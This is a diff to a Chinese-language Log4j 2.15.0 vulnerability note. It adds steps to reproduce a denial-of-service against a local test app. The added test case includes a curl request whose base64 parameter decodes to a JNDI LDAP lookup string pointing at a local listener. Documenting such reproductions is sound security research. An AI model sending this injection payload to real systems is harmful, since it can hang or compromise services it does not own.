@@ -37,6 +37,8 @@ Log4j2.15.0 有DOS风险。
 注: message需要base64encode
 
 
+
+
 ### 第二种情况
 
 
@@ -61,3 +63,14 @@ Log4j2.15.0 有DOS风险。
 漏洞复现URL：`http://localhost:8080/poc2?message=payload`
 
 注: message需要base64encode
+
+### 测试用例
+
+1. 本地起一个http服务，python -m http.server 7777
+
+2. 发起payload
+curl http://127.0.0.1:8080/test\?message\=JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6Nzc3N30=
+
+3. 查看console和http记录，可以发现请求keep alive, 被阻塞了，故存在dos风险
+
+![](./assets/http_response.png)
